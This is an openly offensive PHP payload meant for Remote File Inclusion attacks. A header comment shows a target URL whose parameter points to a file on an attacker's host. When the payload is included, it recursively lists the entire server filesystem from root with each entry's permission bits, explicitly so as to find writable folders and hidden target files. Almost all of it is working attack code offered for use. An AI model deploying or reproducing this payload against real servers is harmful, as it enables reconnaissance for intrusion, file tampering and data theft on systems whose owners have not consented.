//
//
//   PHP RFI index    ex. http://target.site/php/index.php?PARAM=http://attacker.site/files.php 
//  Should show a tree of directories and files with permissions to discover writable files/folders and target files that may have non-standard names.
//  Found original code from http://stackoverflow.com/posts/24758129/revisions and modified to add permissions.
//  
//


<?php
$pathLen = 0;

function prePad($level)
{
  $ss = "";

  for ($ii = 0;  $ii < $level;  $ii++)
  {
    $ss = $ss . "|&nbsp;&nbsp;";
  }

  return $ss;
}

function myScanDir($dir, $level, $rootLen)
{
  global $pathLen;

  if ($handle = opendir($dir)) {

    $allFiles = array();

    while (false !== ($entry = readdir($handle))) {
      if ($entry != "." && $entry != "..") {
        if (is_dir($dir . "/" . $entry))
        {
          $allFiles[] = "D: " . $dir . "/" . $entry;
        }
        else
        {
          $allFiles[] = "F: " . $dir . "/" . $entry;
        }
      }
    }
    closedir($handle);

    natsort($allFiles);

    foreach($allFiles as $value)
    {
      $displayName = substr($value, $rootLen + 4);
      $fileName    = substr($value, 3);
      $linkName    = str_replace(" ", "%20", substr($value, $pathLen + 3));
      if (is_dir($fileName)) {

	  
	  $perms = fileperms($fileName);
echo $perms;

switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = 'r';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: // unknown
        $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

//echo "poop";
//echo $level;
echo "<br>";
echo $info;
echo prePad($level) . $linkName . "<br>\n";

        myScanDir($fileName, $level + 1, strlen($fileName));
      } else {
      echo prePad($level) . "<a href=\"" . $linkName . "\" style=\"text-decoration:none;\">" . $displayName . "</a><br>\n";


// file perms blob part 2
$perms = fileperms ($fileName);

switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = 'r';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: // unknown
        $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));


echo $info;
echo prePad($level) . "<a href=\"" . $linkName . "\" style=\"text-decoration:none;\">" . $displayName . "</a><br>\n";
      }
    }
  }
}

?><!DOCTYPE HTML>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Site Map</title>
</head>

<body>
<h1>Site Map</h1>
<p style="font-family:'Courier New', Courier, monospace; font-size:small;">
<?php
  $root = '/';   // Change this to the root of the actual file system. Needed when /dev/* gets out of hand.

  $pathLen = strlen($root);

  myScanDir($root, 0, strlen($root)); ?>
</p>
</body>

</html>
